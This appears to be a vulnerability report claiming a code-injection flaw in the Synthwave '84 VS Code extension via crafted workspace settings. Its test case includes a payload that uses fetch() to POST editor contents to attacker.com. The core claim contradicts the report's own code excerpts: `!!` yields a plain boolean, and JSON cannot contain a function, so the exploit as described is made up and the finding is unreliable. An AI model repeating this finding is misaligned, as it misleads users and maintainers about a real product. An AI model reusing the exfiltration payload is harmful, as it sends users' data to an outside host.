# Vulnerabilities in Synthwave '84 VS Code Extension

## Vulnerability 1: Command Injection via Malicious Workspace Settings

### Vulnerability Name
Remote Code Execution via Workspace Settings Manipulation

### Description
The Synthwave '84 VS Code extension processes user configuration from workspace settings without sufficient validation when enabling the "Neon Dreams" effect. When the extension is activated and the user enables the glow effect, it reads configuration values from the workspace settings and injects them directly into a JavaScript template. A malicious repository can include a carefully crafted `.vscode/settings.json` file with values that bypass the minimal sanitization, resulting in JavaScript code execution in the VS Code context.

Step by step exploitation:
1. An attacker creates a malicious repository with a `.vscode/settings.json` file containing crafted values for `synthwave84.disableGlow`.
2. The victim with Synthwave '84 installed opens this repository in VS Code.
3. When the victim activates the "Enable Neon Dreams" command from the command palette, the extension reads the malicious workspace setting.
4. The extension performs minimal sanitization (using `!!` operator) which can be bypassed.
5. The extension substitutes the value directly into a JavaScript template without proper escaping.
6. The modified JavaScript containing the injected code is written to a file in the VS Code installation directory.
7. VS Code loads this JavaScript, executing the attacker's code in the VS Code process context.

### Impact
If successfully exploited, this vulnerability allows an attacker to execute arbitrary JavaScript code in the context of the VS Code application. This can lead to:
- Access to all files open in the editor
- Execution of commands on the victim's machine with the same permissions as VS Code
- Potential exfiltration of sensitive data from other repositories
- Installation of additional malicious extensions
- Persistence through modification of VS Code's installation files

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension attempts to sanitize the `disableGlow` value using the `!!` operator to coerce it to a boolean. However, this is insufficient to prevent code injection as JavaScript objects with custom `toString()` methods can bypass this protection.

### Missing Mitigations
- Input validation should be strengthened to ensure only primitive boolean values are accepted.
- The extension should use a safer method for template substitution that properly escapes or encodes user-provided values.
- The extension should validate the final generated JavaScript before writing it to disk.
- Consider using a sandboxed approach for applying theme effects rather than modifying VS Code core files.

### Preconditions
- The victim must have the Synthwave '84 extension installed.
- The victim must open a repository containing malicious workspace settings.
- The victim must execute the "Enable Neon Dreams" command from the command palette.

### Source Code Analysis
The vulnerability originates in the `extension.js` file:

1. The extension reads workspace settings without sufficient type validation:
```javascript
const config = vscode.workspace.getConfiguration("synthwave84");
let disableGlow = config && config.disableGlow ? !!config.disableGlow : false;
```

2. The `disableGlow` value is directly substituted into a JavaScript template:
```javascript
const jsTemplate = fs.readFileSync(__dirname +'/js/theme_template.js', 'utf-8');
const themeWithGlow = jsTemplate.replace(/\[DISABLE_GLOW\]/g, disableGlow);
```

3. In `theme_template.js`, the placeholder appears in function calls:
```javascript
initNeonDreams([DISABLE_GLOW]);
```

4. If the attacker provides an object with a custom `toString()` method in the workspace settings instead of a primitive boolean value, the string replacement will call this method, allowing code injection.

5. The modified JavaScript is then written to a file and loaded by VS Code:
```javascript
fs.writeFileSync(templateFile, finalTheme, "utf-8");
output = html.replace(/\<\/html\>/g, `<!-- SYNTHWAVE 84 --><script src="neondreams.js"></script><!-- NEON DREAMS -->\n`);
```

### Security Test Case
1. Create a malicious repository with a `.vscode/settings.json` file containing:
```json
{
  "synthwave84.disableGlow": {
    "toString": function() { 
      return "false; const malicious = new Function('return fetch(\\'https://attacker.com/steal\\', {method: \\'POST\\', body: JSON.stringify({data: document.body.innerHTML})})'); malicious(); //"; 
    }
  }
}
```

2. Share this repository with the target user who has the Synthwave '84 extension installed.

3. When the victim opens the repository and activates the "Enable Neon Dreams" feature from the command palette, the extension will:
   - Read the malicious workspace setting
   - Replace the `[DISABLE_GLOW]` placeholder with the result of calling `toString()` on the object
   - Write the resulting JavaScript to a file
   - Modify VS Code's HTML to load this script

4. Upon VS Code reloading, the injected malicious code will execute, sending the contents of the editor to the attacker's server.

5. To verify successful exploitation without actually exfiltrating data, replace the payload with a simple `alert('Code execution successful')` and check if the alert appears after VS Code reloads.